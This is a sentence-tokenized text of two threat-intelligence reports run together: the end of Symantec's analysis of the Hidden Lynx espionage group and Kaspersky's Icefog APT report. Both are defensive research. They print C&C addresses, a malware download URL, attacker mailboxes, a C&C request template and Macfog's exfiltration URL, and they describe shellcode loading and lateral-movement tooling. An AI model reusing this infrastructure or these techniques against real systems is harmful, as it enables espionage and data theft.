A campaign distributing Moudoor on such a large scale would require a sizeable team to operate and maintain remote access to these compromised computers .
The breach phase of the operation could easily be handled by a smaller team , which then passes control to a larger team of operators who can traverse networks and retrieve the information they are tasked with gaining access to .
To efficiently attack this many organizations concurrently would require an equally large number of operators .
These Trojans require manual operation so it 's conceivable that tens if not hundreds of operators would be used post - breach to process and handle the stolen data .
The VOHO campaign is one of a number of campaigns attributed to this group over the last four years .
It showed how quickly the group could change their strategy and the lengths they would go to get to their targets .
The fact that the Bit9 code - signing certificate breach was only a small part of this campaign shows how adaptable and determined the group is .
The group is highly organized and can gain advanced access to zero - day vulnerabilities .
In February , the Hidden Lynx group used this advanced knowledge to take advantage of the Oracle Java SE CVE-2013 - 1493 Remote Code Execution Vulnerability ( CVE-2013 - 1493 ) to attack Japanese targets in the FINSHO campaign .
Within two days of Bit9 's blog post on February 25 , the attackers began distributing Moudoor and Naid in a campaign that leveraged CVE-2013 - 1493 .
Interestingly , the C & C server configured in Naid ( 110.173.55.187 ) was also configured in a sample found in the Bit9 incident .
Although the version used against Bit9 was not observed elsewhere in the wild , the group 's methodical approach would indicate that a similar campaign may have been intended or that Trojan .
The timeline for exploit development and distribution is illustrated in Figure 9 .
According to Oracle 's blog , CVE-2013 - 1493 was reported to them on February 1 , the same day that class files exploiting it were added to MightDev.jar shown in Figure 10 .
In past Java exploits used by this group , the code was already public knowledge and a patch was already available for the software .
In this case , they gained advanced knowledge from an unknown source - a source with early access to the exploit conditions , possibly on the same day as Oracle .
Oracle released the fix for CVE-2013 - 1493 on March 4 .
Figure 11 illustrates the relationship between FINSHO and the Bit9 incident through the shared C & C server used in both Naid configurations .
Alternate C & C servers and separate websites for distribution provide further evidence that there are distinctions between how these teams operate .
The Hidden Lynx group continued to attack the defense industry post - VOHO .
In another campaign named SCADEF , manufacturers and suppliers of military - grade computers were observed installing a Trojanized Intel driver application .
The attackers bundled this Intel driver application with variants of Backdoor . Moudoor using a popular Chinese archiving application called Haozip .
The attackers likely compromised a legitimate download of this driver application from a non - reputable source but the true source was never discovered in this investigation .
The technique is another avenue into hardened networks of interest .
They attack not only hardware suppliers , but contractors that may access these network during their course of work .
The group seeks out the weakest link in the chain and simply lies in wait .
In these specific attacks , they simply wait for a shipment of compromised computers to be installed into the targeted network .
Unique detections observed for these Trojanized applications are presented in Figure 12 .
The VOHO , FINSHO and SCADEF campaigns each showed how efficient and adaptable the group is when focusing on their targets .
They use a wide range of advanced attack methods and change their strategy when required to carry out each operation .
These three campaigns are only some of the operations undertaken by the Hidden Lynx group , making them a credible threat to several industries .
From the evidence seen , it 's clear that Hidden Lynx belongs to a professional organization .
Cyberespionage campaigns are becoming increasingly common , with countless threat actors attempting to gain footholds into some of the best - protected organizations .
These attacks are becoming increasingly sophisticated .
The capabilities and tactics used by these threat actors vary considerably .
The Hidden Lynx group is capable of undertaking focused attacks against niche targets and running large - scale campaigns targeting multiple organizations on a global scale .
They have seen action in numerous campaigns since 2009 and repeatedly attack their targets with cutting - edge techniques .
They quickly adapt to security counter - measures and are highly motivated .
They are one of the most well - resourced and capable attack groups in the targeted threat landscape .
From the evidence seen , it 's clear that Hidden Lynx belongs to a professional organization .
They operate in a highly efficient manner .
They can attack on multiple fronts .
They use the latest techniques , have access to a diverse set of exploits and have highly customized tools to compromise target networks .
Their attacks , carried out with such precision on a regular basis over long periods of time , would require a well - resourced and sizeable organization .
They possess expertise in many areas , with teams of highly skilled individuals who can adapt rapidly to the changing landscape .
This team could easily consist of 50 - 100 individuals .
This level of resources would be needed to build these Trojans , maintain infection and C & C infrastructure and pursue confidential information on multiple networks .
They are highly skilled and experienced campaigners in pursuit of information of value to both commercial and governmental organizations .
The incident in Bit9 , which ultimately led to successful compromises of hard - to - crack targets during the VOHO campaign , only serves to highlight this fact .
The evolving targeted attack landscape is becoming increasingly sophisticated .
As organizations implement security counter - measures , the attackers are adapting at a rapid rate .
With a growing number of threat actors participating in these campaigns , organizations have to understand that sophisticated attackers are working hard to bypass each layer of security .
It 's no longer safe to assume that any one solution will protect a company 's assets .
A variety of solutions need to be combined and , with a better understanding of the adversary , tailored to adequately protect the information of most interest to the attackers .
The Hidden Lynx group 's mission is large and they 're targeting a diverse set of information .
The frequency and diversity of these attacks would indicate that the attackers are tasked with sourcing information from many organizations .
These tasks are likely distributed within the team .
The group 's goal is to gain access to information within organizations in some of the wealthiest and most technologically advanced countries across the globe .
It is unlikely that they can use this information for direct financial gain , and the diversity of the information and number of distinguishable campaigns would suggest that they are contracted by multiple clients .
This leads us to believe that this is a professional organization that offers a `` hackers for hire '' service .
The worrying knock - on effect of this group 's activities is that other threat actors are learning and adopting their techniques .
The Hidden Lynx group is not basking in their past glories , they are continuing to refine and streamline their operations and techniques to stay one step ahead of their competition .
Organizations that are being attacked on multiple fronts need to better protect the information that is most valuable to them .
We expect these attackers to be involved in many more high profile campaigns in the coming years .
They will continue to adapt and innovate .
They will continue to provide information servicing interests at both a corporate and state level .
Groups like Hidden Lynx are certainly winning some of the battles , but as organizations gain a better understanding of how these groups operate , they can take steps to help prevent their most valuable information from falling into attackers ' hands .
The three campaigns that have already been examined in detail are only a snapshot of the group 's activities .
Since the time they adopted Moudoor in late 2011 , persistent attacks against organizations across the globe have been occurring on a regular basis , even to this day .
These attackers pioneered the watering - hole technique , however they can also fall back to more traditional methods of attack , such as spear - phishing emails , supply chain attacks and Trojanized software updates .
Since 2011 , the Hidden Lynx group has leveraged five browser - based exploits for payload distribution , three of which were zero - day exploits .
The list of browser - based exploits used by the Hidden Lynx group since the introduction of Moudoor is presented in Table 1 .
In the first half of 2012 , there was a particularly high distribution of Moudoor .
There was a peak in June / July as a result of the VOHO campaign which is evident in the graph shown in Figure 13 .
There is also a peak at the beginning of the year which is a result of another high distribution campaign called WSDHEALTHY .
This campaign , along with some other notable attacks and techniques , will be discussed in the following sections .
• GOTHAM – Shared distribution , shared C & C – yet another zero day exploit • WSDHEALTHY – Watering - hole campaigns pre - dating VOHO by seven months • EASYUPDATE – Trojanizing a popular P2P software 's updates On May 30th , The Hidden Lynx group used their first zero - day exploit of 2012 , taking advantage of the Microsoft Internet Explorer CVE-2012 - 1875 Same ID Property Remote Code Execution Vulnerability ( CVE-2012 - 1875 ) in order to distribute Moudoor and Naid from gothamcenter.org , a website devoted to the history of New York .
This was a two - phase attack which saw Team Naid and Team Moudoor share C & C infrastructure ( 219.90.117.132 ) in a smaller campaign that infected organizations in the following industries : • Financial services • Information communications technology • Government • Marketing • Information technology • Aerospace / defense • Energy Many of the industries targeted in this campaign are similar to those targeted in the VOHO campaign , so this could be considered as a pre - cursor to that campaign .
Similar to VOHO , this was a two - phased attack that leveraged two Internet Explorer zero - days for distribution ( CVE-2012 - 1875 and CVE-2012 - 1889 ) .
Similar to VOHO , as Microsoft patched CVE-2012 - 1875 , the attackers halted distribution .
This prevented any unnecessary suspicious activity from being identified that could impact future activity from the compromised website .
A timeline for this activity is presented in Figure 14 .
Sharing C & C infrastructure could indicate that both teams were working closely together and may have divided up the effort during this campaign .
During phase two of this campaign , VOHO began .
The Hidden Lynx group is clearly resourced to operate and maintain distribution and C & C infrastructure across multiple campaigns .
This level of organization requires discipline at multiple levels within the group .
This is not a small group of elite hackers – this is a well - organized professional organization .
One campaign that rivals VOHO in terms of size is WSDHEALTHY .
This is the first campaign where we see the group using Naid and Moudoor together sharing infrastructure and the first links to the Bit9 incident start to emerge .
The Hidden Lynx group began using watering - hole attacks as early as December 2011 .
Although no zero - day exploit was available , they used a patched Java exploit ( CVE-2011 - 3544 ) effectively to distribute Moudoor from three compromised websites .
This campaign provided the first indications that the group was using both Moudoor and Naid to attack targets and share C & C infrastructure .
Along with this , early links to the attacks on Bit9 began to emerge .
The timeline of this activity is shown in Figure 16 .
In these campaigns , the Hidden Lynx group made heavy use of infrastructure in Hong Kong , with the exception of yahooeast.net .
This is this domain that links to the Bit9 attack , as it resolved to 66.153.86.14 – a C & C server used by the Backdoor .
Hikit sample installed after the successful SQL injection attack on Bit9 .
Moudoor was being actively distributed from these websites for two , four and five months respectively .
These are exceptionally long periods of time to retain access to compromised servers for payload distribution of this nature .
The C & C servers used and the links between the Trojans and Bit9 are shown in Figure 17 .
Team Moudoor heavily relies on a dynamic DNS service called DTDNS to rapidly switch between C & C servers .
In fact , they use direct IP connections or DTDNS exclusively to establish C & C communications , with the exception of yahooeast.net which is a registered domain .
The Hidden Lynx group uses techniques which have clearly been established through experience to maintain this infrastructure for long periods of time .
They adapt quickly and likely have a stockpile of C & C servers that they can quickly switch to which provides maximum uptime during any given operation .
Along with this , the Hidden Lynx group uses several different methods to infect their targets .
In the SCADEF campaign , we saw how the group bundled Moudoor with legitimate software to infect targets .
They also managed to Trojanize software updates as well , as seen in the EASYUPDATE campaign where a Chinese P2P application was observed selectively installing Moudoor since 2011 .
Since November 2011 , the Hidden Lynx group has been able to insert Moudoor into the distribution chain of one of the most popular Chinese P2P applications provided by VeryCD.com .
There is a very low distribution of Trojanized updates and it is quite likely that they are somehow selectively installing Moudoor on specific clients .
This is , without a doubt , the longest running distribution vector for the group , which infected victims predominantly in China , the United States and Hong Kong .
These are the earliest indications of Moudoor infections , with `` kissnada '' being one of the first DTDNS domains observed in use .
This distribution vector 's exact purpose is still unclear , however it 's certainly linked to the group , as we have observed Moudoor samples in WSDHEALTHY configured to use kissnada58 .
chatnook.com and usa-mail.scieron.com for C & C communications .
The Hidden Lynx group has left a clear fingerprint for the past two years with clearly identifiable links to the group 's activities .
The use of customized Trojans , shared distribution and C & C infrastructure , coupled with repeated attacks on a predictable set of target organizations has allowed a more complete picture of these attacks to be compiled .
A summary of the links between all of these attacks is presented in Figure 20 .
The following section lists the Trojans that were used by the Hidden Lynx group throughout their various campaigns .
In 2011 , the Hidden Lynx group began to use Backdoor .
Moudoor .
This is a customized version of `` Gh0st RAT '' .
Gh0st RAT variants have been used in cyberespionage campaigns emanating from China for years .
In 2009 , Information Warfare Monitor published a detailed report , `` Tracking GhostNet '' , following an investigation into a cyberespionage network of more than 1,000 compromised computers affecting more than 100 countries .
Many threat actors use customized versions of this RAT for cyberespionage operations .
The team uses Trojan . Naid for special operations .
It first appeared in May 2009 and has been used in many high profile attacks over the past four years .
It shares technical similarities with other Trojans which also originate from China .
All of these Trojans are potentially from the same group or they may source these Trojans from the same developer .
The technical similarities are based on a shared file creation template and C & C protocol .
The other Trojans that share these traits are : • Backdoor . Vasport • Backdoor . Boda File creation template % TEMP % \uid.ax % % TEMP % % \ % s.ax % % TEMP % % \ % s _ p.ax Command and control template POST http : // % ls : % d/ % x HTTP/1.1 Content - Length : 2 CONNECT % ls : % d HTTP/1.1 Connection : keep - alive lynx There is also evidence that Backdoor . Vasport and Trojan .
Naid have shared the same packer to obfuscate the payloads from AV detection .
The obfuscation tool used is also Chinese in origin and has a simple user interface to help pack these Trojans .
Naid also has a history of using stolen digital certificates to overcome trust - based protection when attacking certain hardened targets .
Some of the certificates identified are shown in Figure 22 .
Backdoor . Vasport was delivered by exploiting the Adobe Flash Player CVE-2012 - 0779 Object Type Confusion Remote Code Execution Vulnerability ( CVE-2012 - 0779 ) .
This was delivered in malicious Word documents in targeted attack emails .
The exploit component used in these attacks was also used in the Elderwood Platform .
Table 2 shows the payload from the malicious word documents .
In a more recent campaign called Ladyboyle , Backdoor . Boda was being distributed to take advantage of the Adobe Flash Player CVE-2013 - 0634 Remote Memory Corruption Vulnerability ( CVE-2013 - 0634 ) .
These files were signed with a digital signature from MGAME Corporation , a tactic used previously by the attackers .
Interestingly , Backdoor . Boda and Backdoor . Vasport were both distributed using Flash zero - day exploits in embedded documents .
It 's plausible that the group has a team dedicated to distribution using Flash exploits that customizes Trojans from the same code base that the Naid uses .
The Hidden Lynx group has used cutting - edge attack techniques and a consistent methodology .
Trojan . Naid has been in use since 2009 and Hidden Lynx attacks bear the hallmarks of a campaign that involved yet another Internet Explorer zero - day exploit in December 2009 .
Trojan . Naid was used in the infamous attacks on organizations in the financial , technology , Internet and media sectors called `` Operation Aurora '' .
These attacks are linked with another Trojan called Trojan . Hydraq , but Naid was downloaded in stage three of the operation .
Trojan . Hydraq disappeared from the targeted attack landscape shortly after Operation Aurora , most likely due to the close attention that it was receiving from security researchers .
Trojan . Naid did not meet the same fate , as it is still being used in sophisticated targeted attacks to this day .
• http : //www.symantec.com / connect / blogs / hydraq - attack - mythical - proportions • http : //googleblog.blogspot.ie/2010/01/new - approach - to - china.html • https : //blog.bit9.com/2013/02/08/bit9-and - our - customers - security/ • https : //blog.bit9.com/2013/02/25/bit9-security - incident - update/ • http : //www.symantec.com / security_response / writeup.jsp ? docid=2012 - 082113 - 5541 - 99 • http : //www.symantec.com / security_response / writeup.jsp ? docid=2012 - 061518 - 4639 - 99 • http : //blogs.rsa.com / wp - content / uploads / VOHO_WP_FINAL_READY - FOR - Publication-09242012_AC.pdf • http : //threatpost.com / why - watering - hole - attacks - work-032013 • http : //www.symantec.com / connect / blogs / latest - java - zero - day - shares - connections - bit9-security - incident • http : //www.cio.com / article/732122/_Aurora_Cyber_Attackers_Were_Really_Running_Counter_Intelligence • http : //www.infowar - monitor.net/2009/09/tracking - ghostnet - investigating - a - cyber - espionage - network/ • http : //www.symantec.com / security_response / writeup.jsp ? docid=2012 - 051606 - 5938 - 99 • http : //www.symantec.com / connect / blogs / elderwood - project • http : //www.symantec.com / connect / blogs / adobe - zero - day - used - ladyboyle - attack Many different Symantec protection technologies play a role in defending against this threat , including : Traditional antivirus protection is designed to detect and block malicious files and is effective against files associated with this attack .
• Trojan . Hydraq • Backdoor . Moudoor • Trojan . Naid • Backdoor . Hikit • Backdoor . Vasport • Backdoor . Boda Network - based protection in Symantec Endpoint Protection can help protect against unauthorized network activities conducted by malware threats or intrusion attempts .
Behavior - based detection blocks suspicious processes using the Bloodhound . SONAR series of detections • Norton Safeweb blocks users from visiting infected websites .
• Insight detects and warns against suspicious files as WS.Reputation.1 Authors Stephen Doherty Senior Threat Intelligence Analyst Jozsef Gegeny Software Engineer Branko Spasojevic Sr Software Engineer Jonell Baltazar Sr Software Engineer About Symantec Symantec protects the world 's information and is the global leader in security , backup , and availability solutions .
Our innovative products and services protect people and information in any environment - from the smallest mobile device to the enterprise data center to cloud - based systems .
Our industry - leading expertise in protecting data , identities , and interactions gives our customers confidence in a connected world .
More information is available at www.symantec.com or by connecting with Symantec at go.symantec.com/socialmedia .
Follow us on Twitter Headquartered in Mountain View , Calif. , @ threatintel Symantec has operations in 40 countries .
More information is available at www.symantec.com .
Visit our Blog http : //www.symantec.com / connect / symantec - blogs / sr For specific country offices and contact numbers , please visit our website .
Symantec World Headquarters Copyright © 2013 Symantec Corporation .
All 350 Ellis St. Mountain View , CA 94043 USA + 1 ( 650 ) 527 - 8000 1 ( 800 ) 721 - 3934 Copyright 2013 Symantec Corporation .
All rights reserved .
Symantec , the Symantec Logo , and the Checkmark Logo are trademarks or registered trademarks of Symantec Corporation or its affiliates in the U.S. and other countries .
Other names may be trademarks of their respective owners .
Any technical information that is made available by Symantec Corporation is the copyrighted work of Symantec Corporation and is owned by Symantec Corporation .
NO WARRANTY .
The technical information is being delivered to you as is and Symantec Corporation makes no warranty as to its accuracy or use .
Any use of the technical documentation or the information contained herein is at the risk of the user .
Documentation may include technical or other inaccuracies or typographical errors .
Symantec reserves the right to make changes without prior notice .
'' Icefog '' is an Advanced Persistent Threat that has been active since at least 2011 , targeting mostly Japan and South Korea .
Known targets include governmental institutions , military contractors , maritime and shipbuilding groups , telecom operators , industrial and high - tech companies and mass media .
The name `` Icefog '' comes from a string used in the command - and - control server name in one of the samples .
The command - and - control software is named `` Dagger Three '' , in the Chinese language .
The `` Icefog '' backdoor set ( also known as `` Fucobha '' ) is an interactive espionage tool that is directly controlled by the attackers .
There are versions for both Microsoft Windows and Mac OS X .
In its latest incarnation , Icefog does n't automatically exfiltrate data , instead , it is operated by the attackers to perform actions directly on the victim 's live systems .
During Icefog attacks , several other malicious tools and backdoors were uploaded to the victims ' machines , for data exfiltration and lateral movement .
This document includes a description of the backdoors , other malicious tools , together with remediation information .
( `` Indicators of compromise '' ) The Icefog targeted attacks rely on spear - phishing e - mails that attempt to trick the victim into opening a malicious attachment or a website .
During our investigation , we identified several types of exploits being used through spear - phishing e - mails against the targets : > > CVE-2012 - 1856 ( the `` Tran Duy Linh '' ( also see : http : //blog.malwaretracker.com/2013/06/ tomato-garden-campaign-possible.html ) exploit fixed in Microsoft 's MS12 - 060 security bulletin ) > > CVE-2012 - 0158 ( the MSCOMCTL.OCX remote code execution vulnerability fixed with Microsoft 's MS12 - 027 security bulletin ) > > Web links to Oracle Java exploits ( CVE-2013 - 0422 and CVE-2012 - 1723 ) > > HLP exploits and abuse of features > > HWP exploits The first two vulnerabilities are exploited through Microsoft Office documents ( Word and Excel ) that drop and execute the backdoor and show a fake `` lure '' document to the victim .
These appear to be the most common methods used by the attackers at this moment .
The victim receives an e - mail with an attachment that is either a Word ( .doc
) or Excel ( .xls
) file .
EXAMPLE ' A ' The attachment is a standard `` Tran Duy Linh '' exploit for CVE-2012 - 1856 .
Upon successful execution , the exploit displays a decoy document featuring a picture of a scantily clad woman : EXAMPLE ' B ' Upon successful execution , this shows a clean , fake `` lure '' document in Japanese titled `` Little enthusiasm for regional sovereignty reform '' : EXAMPLE ' C ' This is a business e - mail in Japanese : The same malware was used to spear - phish multiple targets in Japan .
Another example ( d6c90955c6f2a346c9c91be82a1f9d8c ) looks like this : In addition to Microsoft Office exploits , the Icefog attackers are known to be using Java exploits , hosted online .
For instance , one of the malicious websites used in the attacks was `` money.cnnpolicy.com '' .
The Java exploit downloaded and executed an Icefog dropper from the following URL : www.securimalware [ dot ] net / info / update.exe Note : This website is now SINKHOLED by Kaspersky Lab .
The `` update.exe '' is a standard Icefog dropper , with the following information : Upon execution , it installs the Icefog malware as `` sxs.dll '' in the Internet Explorer folder ( usually `` C : \ Program Files\Internet Explorer '' ) : To receive control , the malware DLL ( `` sxs.dll '' ) uses a technique known as `` DLL search order hijacking '' , which abuses the fact that Internet Explorer will load this file from its own directory , instead of the Windows SYSTEM folder .
The backdoor beams out to the command - and - control server at www.setchon [ dot ] com / jd/ upload.aspx The Icefog attackers are also using HLP files to infect their targets .
The HLP files do not contain exploits but they are abusing certain Windows `` features '' to drop the malware .
It 's interesting to know that Icefog is not the only crew to heavily use HLP `` exploits '' as a part of their toolkit .
Well known , very effective APT like the `` Comments Crew '' / APT1 , have included the HLP trick in their kits , along with other lesser known crews .
This HLP format is an older one , known as `` Winhelp '' , which was natively supported up until Vista and Windows 7 , when Microsoft shipped a separate Winhlp32.exe component to help phase out the technology .
Most likely , the choice to abuse Winhelp indicates that the attackers have an idea of what version operating systems they are attacking .
In very conservative terms , this implementation of HLP files is not an `` exploit '' , but instead , abuse of a poorly constructed Windows Help feature .
Code and data is mixed in this file format , and the Icefog attackers abused it with custom macros .
A fine description of `` custom macros '' and the risks of building them in to WinHelp projects is provided by Ruben Santamarta : http : //reversemode.com / index2.php ? option = com_content & do _ pdf=1 & id=4 EXAMPLES Let 's take a quick look at an example of how the Icefog attackers abused the provided WinHelp functionality by examining the relevant custom macros , API calls and shellcode .
This sample uses standard Win32 API to allocate memory with the execution flag set , copies ( using long string copy ) XOR'ed `` shellcode '' and calls CreateThread to transfer execution to the malicious payload .
In the screenshot above , `` RR '' means RegisterRoutine .
After registration , one can simply call the respective function .
Next , the sample allocates memory with execution flag , and copies XOR'ed `` shellcode '' .
To execute the code , a simple call to CreateThread ( ) suffices : The shellcode is encrypted with a simple 0xBF XOR operation : Upon execution , the shellcode installs an Icefog backdoor that communicates with the C2s at : '' www.samyongonc [ dot ] com / jd / upload.aspx '' and `` www.625tongyi [ dot ] com / jd / upload.aspx '' During our investigation , we observed Icefog attacks using HWP files .
These are document files used by the Hangul Word Processor .
According to Wikipedia , Hangul ( also known as Hangul Word Processor or HWP ) is a proprietary word processing application ( link to : http : //en.wikipedia.org/ wiki / Hangul _ ( word_processor ) ) published by the South Korean company Hancom Inc .
It is used extensively in South Korea , especially in the government sector .
Unfortunately , we were not able to obtain any of these files , although they were used to successfully attack and infect victims .
Users of HWP should be aware of these exploits and update their Hangul Word Processor installation to the most recent version .
The attack is initiated through spear - phishing e - mails , taking advantage of multiple known ( already patched ) vulnerabilities .
Once they successfully infect a machine , the operators perform several basic functions to identify and confirm the nature of the victim : > > List folders on disk such as `` My Documents '' and the Desktop .
> > List adapters and IP configurations .
> > Get information about the victim and their network .
If the victims looks `` genuine '' ( they avoid working with virtual machines and `` fake '' victims ) they further deploy additional software , including : > > Type `` 2 '' backdoors that use a newer protocol for communication .
> > Lateral movement tools such as : • Password and hash dumping tools .
• Tools to dump Internet Explorer saved passwords .
• Tools to dump Outlook e - mail accounts and passwords .
• Debugging tools .
• The legitimate `` RAR '' program to compress stolen data .
We have documented three main types of stolen data : > > Windows address books , .WAB
files .
> > Documents , including HWP , XLS and DOC files .
> > User account credentials .
If stolen information represents large files , they are compressed with the popular tool WinRAR ( split into volumes ) or CABARC and transferred to the command - and - control part by part .
Several known variants of the Icefog backdoor are known to exist .
We list these as following : > > The `` old '' 2011 Icefog - which sends stolen data by e - mail ; this version was used against the Japanese House of Representatives and the House of Councillors in 2011 .
> > Type `` 1 '' `` normal '' Icefog - which interacts with command - and - control servers .
> > Type `` 2 '' Icefog - which interacts with a script - based proxy server that redirects commands from the attackers to another machine .
> > Type `` 3 '' Icefog - We do n't have a sample of this variant but we observed a certain kind of C & C that uses a different communication method ; we suspect there are victims infected with this malware .
> > Type `` 4 '' Icefog - same situation as `` type 3 '' .
> > Icefog - NG - which communicates by direct TCP connection to port 5600 .
Back in 2011 , we analyzed malware samples that were used to attack several Japanese organizations .
Among of the attacked organizations were the Japanese `` House of Representatives '' and the `` House of Councilors '' .
Both samples beacon out to the C & C at `` www.cloudsbit.com '' , although to different scripts : `` /dj/ upload.aspx '' and `` /jd2web / upload.aspx '' .
In addition to the normal command - and - control mechanism , these older samples feature another capability , which involves e - mail accounts on AOL.COM : harrypottercommand001 @ aol.com jd2command092 @ aol.com jd2clientsend @ aol.com woshihero009 @ aol.com mrmylcmd009 @ aol.com defaultmail002 @ aol.com The malware has the ability to connect to these accounts by POP3 and fetch commands from the mailbox .
It also has the ability to send stolen data by e - mail , by contacting smtp.aol.com and sending e - mail messages directly .
Here 's what such a session looks like : One of the samples used in the attacks drops a `` lure '' photo depicting a Japanese audience : Of the e - mail accounts used by the backdoor , one of them was interesting : woshihero009 [ at ] aol.com Back in August 2011 , when these attacks took place , this mailbox had several hundred e - mails with stolen information from the victims .
Interestingly , their address book contained a number of e - mail addresses to which e - mails were forwarded and were automatically added to the address book .
The Icefog type `` 1 '' backdoor is a remotely controlled Trojan that supports a variety of functions .
Versions of this backdoor are available for Microsoft Windows and Mac OS X .
It has the ability to : > > Hijack and upload basic system information to C & C servers owned and controlled by the attackers .
> > Give the attackers access to push and run commands on the infected system .
> > Steal and upload files from the victims to the command - and - control servers .
> > Download files ( tools ) from the C & C servers to the infected computers .
> > Give access to the attackers to directly execute SQL commands on any MSSQL servers in the network .
For a technical description of the type `` 1 '' Icefog backdoor , see Appendix B .
The type `` 2 '' Icefog backdoor is very similar to type 1 .
However it uses a proxy server for the commands .
This behavior relies on a set of ASP scripts , which act as a buffer between the real C & C backend and the victim .
It offers another level of anonymity to the attackers , as it can be controlled ( for instance ) via Tor or another anonymizing method .
We have n't observed the use of Type `` 2 '' backdoors directly against the victims .
Instead , the type '' 2 '' backdoor is used as an upgrade to Type `` 1 '' infections , together with a special loader tool .
It uses a script named `` alive.asp '' for most of the operations .
( example C & C URL : www.chinauswatch [ dot ] net / test / space.asp - SINKHOLED by Kaspersky Lab ) .
Type `` 2 '' Icefog exists as shellcode files , usually named `` msuc.dat '' .
These are loaded through the use of a special tool .
Loaders : In terms of functionality , type `` 2 '' Icefog is similar to type `` 1 '' .
The only difference is that the malware does not have persistence in the system and disappears after reboot .
Although we do n't have samples of these variants , we observed and sinkholed a certain kind of Icefog - related command - and - controls that use a different communication method ; we suspect there are victims that are infected with this malware .
Type `` 3 '' Icefog uses scripts named `` view.asp '' and `` update.asp '' .
Known C & C URLs : www.krentertainly [ dot ] net / web / view.asp disneyland.website.iiswan [ dot ] com / web / view.asp Type `` 4 '' Icefog uses scripts named `` upfile.asp '' .
Known C & C URL : www.pinganw [ dot ] org / sugers / upfile.asp - SINKHOLED by Kaspersky Lab ) We continue to look for these variants and will update the paper when or if they are identified .
Type `` NG '' Icefog is the most recent version of this backdoor .
It is designed to communicate directly with a command - and - control software that runs on Microsoft Windows computers .
For a thorough technical description of the type `` 1 '' Icefog backdoor , see Appendix C. In late 2012 , the Icefog attackers experimented with a Mac OS X version of Icefog .
This particular version of the malware was seeded in a number of Chinese BBS forums and masked as a graphic application .
Here is an example : http : //bbs.pcbeta.com / forum.php ? mod = viewthread & tid=1157944 & page=1 # pid30109870 On 19 October 2012 , the user `` appstoer '' advertised an application named `` Img2icns.rar '' .
The archive contains a Mac OS X application that drops and installs the Macfog malware .
We were able to find two such archives , but there are probably more .
The malicious modules have the following identification data : The Macfog backdoor is a 64-bit Apple Mac OS X Mach - O executable , compiled with the LLVM Clang package .
It uses the type `` 1 '' C & C servers protocol to communicate and has the same capabilities as the Windows version .
We are including a brief description below ; a full description of the malware is available in Appendix D : MACFOG : SUMMARY DESCRIPTION The Macfog backdoor is very similar to its Win32 siblings .
It collects unique system information and POSTs this data to a hardcoded URL : hxxp : //appst0re.net / upload.aspx ? filepath= % order / ok / arbitrary name % & filename= % hostname % .jpg
The backdoor is capable of familiar functionalities : system information collection , communication over HTTP with the C & C , download and upload files and execute system commands .
The Macfog backdoor is different from the Windows variant from the point of view of usage by the attackers .
So far , we have n't identified victims of targeted attacks being infected with it , although we do believe they exist .
The seeding of this version through Chinese bulletin boards resulted in a few hundred infections worldwide .
We believe this could have been a beta - testing phase for Mac OS X versions to be used in targeted attacks later .
The attackers rely on a multitude of lateral movement tools that are deployed to the victims through the command - and - control servers .
The tools we observed cover a variety of functions , such as dumping Windows user credentials , Outlook and Internet Explorer saved passwords , and the gathering of system information .
One of the servers we analyzed had an open folder where some of the filenames of the lateral movement tools were still visible , although most were truncated to 0 by the C & C upon successful execution on the victim : A description of some of the tools we observed follows : In addition to these , several other tools were observed but not recovered .
For instance , on one of the victim machines , we observed what appeared to be the use of a Kernel exploit through a Java application for escalation of privileges .
Unfortunately , we do not know if it was a zero - day kernel vulnerability because the file was deleted by the attackers after being used .
During our research , we observed multiple Icefog command and control servers .
Most of them were on shared hosting platforms , however , some of them , which were of greater importance to the attackers , were also using dedicated hosting .
Perhaps one of the most important aspects of the Icefog C & Cs is the `` hit and run '' nature .
The attackers would set up a C & C , create a malware sample that uses it , attack the victim , infect it , and communicate with the victim machine before moving on .
The shared hosting would expire in a month or two and the C & C disappears .
The nature of the attacks was also very focused - in many cases , the attackers already knew what they were looking for .
The filenames were quickly identified , archived , transferred to the C & C and then the victim was abandoned .
Based on the C & C names , we were able to identify several Icefog campaigns that were active between 2011 - 2013 .
From the timeline above , it seems the attackers increased the number of campaigns in 2013 compared to previous years , although it 's possible that malware and artifacts used in earlier years are no longer available .
Hence , the chart probably represents only a fraction of the attackers ' activity during the past years .
We identified four types of Icefog C & C servers - type `` 1 '' , `` 2 '' , `` 3 '' and type `` 4 '' .
Also , there is a fifth , standalone type of C & C , used for Icefog - NG , which runs as a Windows desktop application .
The type `` 1 '' C & C server uses a full web backend that lets the attacker directly control the victims via a web browser .
The type `` 1 '' C2 backend is written in ASP.NET .
The type `` 2 '' C & C server backend we identified acts as a virtual , custom proxy between the attackers and the victims .
It is written in ASP and is extremely simplistic in operation .
This is more effective as it conceals the attacker 's identity .
The second type of C2 works in conjunction with a control tool , probably running directly on the attacker 's PC .
The type `` 3 '' C & C server ( used in the `` starwings '' and `` disneyland '' campaigns ) appears to be experimental and features only two basic functions : view and update .
Its exact workings are unknown and we have n't been able to locate the Icefog malware that uses it .
The type `` 4 '' C & C server was identified through sinkholing of the domain `` pinganw [ dot ] org '' .
( known C2 URL - www.pinganw [ dot ] org / sugers / upfile.asp ) .
Just like type `` 3 '' , the exact workings are unknown and we have n't been able to locate the Icefog malware that uses it .
The Icefog - NG C & C server is a Windows desktop application which does n't require a web server and works as a standalone TCP server , which by default listens on port 5600 .
Our analysis focuses on type `` 1 '' C & C servers , which are the most popular and have been used in most of the attacks we observed .
Here 's a look at the type `` 1 '' command - and - control server login screen : The command - and - control script ( `` control.aspx '' ) features an interesting comment '' shiyanlllllllllllllllllllllllllll '' .
The page title is `` 尖刀三号 '' , which means `` Dagger Three '' in Chinese .
For martial arts fans , the `` 尖刀三号 '' is quite similar to `` 三尖刀 '' , which is an ancient Chinese weapon .
The Type `` 1 '' C2 interface is written in ASP.NET and features an easy to use interface to communicate with and manage the victims : This control panel is actually a Visual Basic . NET web application with the following structure : The application uses the native filesystem as the main storage to save stolen data , logs and temporary files .
Below is short description of directories used by the C & C application : Perhaps the most interesting part is that the type `` 1 '' C & C panel maintains a full history of the attacker 's interaction with the victims .
This is kept as an encrypted logfile , in the `` logs '' directory on the server .
In addition to that , the server maintains full interaction logs and command execution results from each victim .
Below we can see an example of the attackers copying a number of files to `` c : \temp\mslog '' from an USB flash drive connected to the computer with Korean Windows systems and preparing them for upload to the C2 : In another example , we can see them uploading and running a type `` 2 '' backdoor on top of the type '' 1 '' infection : Interestingly , the modern Icefog - NG C & C application looks very similar to Icefog Web UI - it uses the same multi - tab layout and even has the same tab titles .
We believe that Icefog - NG was developed by the same author to replace Icefog bot and the web - based Control Panels .
Icefog - NG was designed to be more responsive and convenient to the operator .
